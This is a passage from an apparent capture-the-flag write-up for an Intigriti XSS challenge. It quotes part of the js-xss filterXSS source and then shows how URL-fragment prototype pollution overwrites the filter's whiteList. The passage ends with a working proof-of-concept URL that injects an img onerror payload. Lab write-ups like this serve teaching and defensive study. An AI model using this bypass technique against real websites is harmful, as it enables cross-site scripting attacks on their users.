        return '</' + tag + '>';
      }

      var attrs = getAttrs(html);
      var whiteAttrList = whiteList[tag];
      var attrsHtml = parseAttr(attrs.html, function (name, value) {

        // 调用onTagAttr处理
        var isWhiteAttr = (_.indexOf(whiteAttrList, name) !== -1);
        var ret = onTagAttr(tag, name, value, isWhiteAttr);
        if (!isNull(ret)) return ret;

        // 默认的属性处理方法
        if (isWhiteAttr) {
          // 白名单属性，调用safeAttrValue过滤属性值
          value = safeAttrValue(tag, name, value, cssFilter);
          if (value) {
            return name + '="' + value + '"';
          } else {
            return name;
          }
        } else {
          // 非白名单属性，调用onIgnoreTagAttr处理
          var ret = onIgnoreTagAttr(tag, name, value, isWhiteAttr);
          if (!isNull(ret)) return ret;
          return;
        }
      });

      // 构造新的标签代码
      var html = '<' + tag;
      if (attrsHtml) html += ' ' + attrsHtml;
      if (attrs.closing) html += ' /';
      html += '>';
      return html;

    } else {
      // 非白名单标签，调用onIgnoreTag处理
      var ret = onIgnoreTag(tag, html, info);
      if (!isNull(ret)) return ret;
      return escapeHtml(html);
    }

  }, escapeHtml);

  // 如果开启了stripIgnoreTagBody，需要对结果再进行处理
  if (stripIgnoreTagBody) {
    retHtml = stripIgnoreTagBody.remove(retHtml);
  }

  return retHtml;
};
```
* This is a Huge Function with lots of Stuffs. btw, we Don't Need to Look into this. Bcoz, We already Have Prototype Pollution. We can Write or Overwrite key-values into `Object Prototype`.
* In order to Bypass this function, We are Going to Overwrite the `process` to make that Weaker to allow our payload :)
---
### Debug:
* To Understand, What to Overwrite, I came back to Localsetup 
* I added a `Console.log` on `process` function to Look into it. 

<img src="https://i.imgur.com/i10aJRC.png">

* Upon Reloading the Page

`url: http://localhost?page=abcd#a[__proto__][abcd]=xss`
<img src="https://i.imgur.com/twJY8zl.png">
* You can See, Our Input is present in the Object Prototype. `abcd:"xss"`. 
* It is Possible to Overwrite the key-values inside the `Object Prototype`, Bcz The Our Input is Parsed Second, Before out input is parsed, the Values are Assigned. Bcz of this, We can Overwrite the Filters. 
* Upload Looking at the Code, I found that, The `filterXSS` function depends in the Object `whiteList` which has only Limited no. of Allowed Tags and attributes. 
<img src="https://i.imgur.com/aSJtgpN.png">
* For example, `a` tag is allowed and `href, title, target` are the allowed attributes. After Searching for Script gadgets here, there is no Script Gadgets, So we Can't Get XSS by bypassing this `filtetXSS` unless if we have `mXSS`. ig so :)

## Overwriting `WhiteList` :
* Overwriting `whitelist` ...
`url: http://localhost:8000/?page=1#a[__proto__][whiteList]=xss`
<img src="https://i.imgur.com/5xExHpr.png">

* You can see, We Successfully Overwritten the `whiteList`.
* In Order to Make it Work, we need to Inject `key-value` pairs. key as `HTML-Tag` and value as `attributes`. 

`url : a[__proto__][whiteList][img]=src%3Dx%20onerror%3Dalert(document.domain)` - [url-encoded]
<img src="https://i.imgur.com/lbQUd58.png">

# Final PoC

* Now We Have `filterXSS` bypass, and can inject our Own Value.
* Injection our payload into `Object Prototype` -> `Prototype Pollution` to Overwrite `filterXSS` function, so Our Payload will not be Filtered. 

PoC: `https://challenge-0522.intigriti.io/challenge/challenge.html?page=6#a[__proto__][6]=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&a[__proto__][whiteList][img]=src%3Dx%20onerror%3Dalert(document.domain)`

urlDecoded: `https://challenge-0522.intigriti.io/challenge/challenge.html?page=6#a[__proto__][6]=<img src=x onerror=alert(document.domain)>&a[__proto__][whiteList][img]=src=x onerror=alert(document.domain)`

<img src="https://i.imgur.com/zbkjuAv.png">

# Final Thoughts
* This Challenge was Really Fun and Easy Challenge. I loved this. Thanks Intigriti  <3


# Resources

* https://www.youtube.com/watch?v=GhJTy5-X3kA
* https://www.youtube.com/watch?v=54GYCl7Beh4 [Language: Tamil]
* https://www.w3schools.com/js/js_object_constructors.asp
